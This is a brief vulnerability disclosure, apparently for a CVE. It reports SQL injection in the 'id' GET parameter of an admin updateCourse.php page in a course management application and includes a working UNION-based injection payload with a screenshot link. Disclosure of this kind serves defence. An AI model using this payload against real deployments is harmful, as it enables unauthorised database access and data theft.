BUG_Author:hukai

Vulnerability File: /CEE/adminpanel/admin/facebox_modal/updateCourse.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=-2' union all select null,concat(0x76777879,0x52535556),null-- -

There is sql injection, and the UNION query is successful

![image](https://github.com/sushanburanxisha/cve/blob/main/sql1.png)
